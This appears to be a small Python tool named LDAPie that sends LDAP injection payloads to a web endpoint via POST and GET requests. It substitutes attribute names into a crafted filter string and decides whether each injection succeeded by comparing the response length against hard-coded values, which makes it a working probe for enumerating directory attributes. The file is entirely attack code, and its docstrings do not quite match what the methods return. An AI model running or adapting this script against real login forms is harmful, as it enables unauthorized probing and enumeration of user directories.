import requests


class LDAPieWorker:
    pass


class LDAPie:

    """
    Send a POST request to a possible LDAP endpoint

    :param url: The URL to POST to
    :returns: A list of dicts with inputUsername and a boolean determining
    if the injection is valid
    """
    @staticmethod
    def post(line, url):
        data = { 'inputUsername': 'ldapuser)({0}=*)))(&{0}=void)'.format(line) }
        headers = { 'Connection': 'Close' }
        r = requests.post(url, headers=headers, data=data)
        response = r.text
        data['is_valid'] = len(response) not in [2810, 2822]
        return data

    """
    Send a GET request to a possible LDAP endpoint

    :param url: The URL to GET
    :returns: A list of dicts with the appended URL and injection validity boolean
    """
    @staticmethod
    def get(line, url):
        url_as_ldap_string = '{0}/?inputUsername=ldapuser)({1}=*))(&{1}=void)'.format(
            url,
            line
        )
        r = requests.get(url_as_ldap_string)
        response = r.text
        data = { 'url': url_as_ldap_string, 'is_valid': len(response) not in [1, 2] }
        return data
